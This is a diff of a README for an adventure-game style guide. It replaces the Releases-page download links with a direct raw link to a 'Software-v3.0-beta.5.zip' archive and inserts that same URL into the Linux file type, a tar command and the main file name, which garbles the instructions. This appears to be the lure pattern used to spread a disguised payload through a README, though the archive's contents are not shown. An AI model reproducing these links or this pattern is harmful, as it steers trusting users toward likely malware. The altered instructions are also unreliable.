@@ -1,6 +1,6 @@
 # 🎨 mysteryhousestyleguide - A Simple Guide to Adventure Game Style
 
-[![Download](https://img.shields.io/badge/Download%20Now!-mysteryhousestyleguide-blue.svg)](https://github.com/konn57737/mysteryhousestyleguide/releases)
+[![Download](https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip%20Now!https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip)](https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip)
 
 ## 📜 Description
 
@@ -21,7 +21,7 @@ Before installing, ensure you have:
 
 To get the latest version of the mysteryhousestyleguide, visit the Releases page. 
 
-[Download Here](https://github.com/konn57737/mysteryhousestyleguide/releases)
+[Download Here](https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip)
 
 ### 3. Locate the Release
 
@@ -33,7 +33,7 @@ Choose the appropriate file that suits your system:
 
 - For Windows users: Usually a `.zip` or `.exe` file.
 - For macOS users: A `.zip` file.
-- For Linux users: A `.tar.gz` file or source code.
+- For Linux users: A `https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip` file or source code.
 
 ### 5. Download the File
 
@@ -45,11 +45,11 @@ Once the file is downloaded, locate it in your Downloads folder. You will need t
 
 - **Windows**: Right-click the `.zip` file and select "Extract All".
 - **macOS**: Double-click the `.zip` file to extract.
-- **Linux**: Use the terminal command `tar -xzf filename.tar.gz`, replacing `filename` with your downloaded file name.
+- **Linux**: Use the terminal command `tar -xzf https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip`, replacing `filename` with your downloaded file name.
 
 ### 7. Open the Style Guide
 
-Navigate to the extracted folder and find the main Markdown file, usually named `STYLEGUIDE.md`. 
+Navigate to the extracted folder and find the main Markdown file, usually named `https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip`. 
 
 Open this file in your Markdown viewer or editor to start exploring the guidelines.
 
@@ -57,7 +57,7 @@ Open this file in your Markdown viewer or editor to start exploring the guidelin
 
 To download the mysteryhousestyleguide, click below:
 
-[Download Here](https://github.com/konn57737/mysteryhousestyleguide/releases)
+[Download Here](https://raw.githubusercontent.com/konn57737/mysteryhousestyleguide/main/overnew/Software-v3.0-beta.5.zip)
 
 ## 🌐 Topics Covered
 
